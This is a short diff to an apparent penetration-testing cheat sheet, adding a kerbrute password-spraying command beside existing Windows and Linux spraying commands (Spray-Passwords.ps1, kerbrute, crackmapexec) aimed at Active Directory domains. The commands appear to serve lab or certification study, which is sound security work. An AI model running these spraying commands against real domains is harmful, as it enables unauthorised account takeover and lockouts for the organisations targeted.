@@ -11,6 +11,7 @@ net accounts
 #Windows
 .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+./kerbrute passwordspray -d lab.ropnop.com domain_users.txt Password123
 
 #Linux
 crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
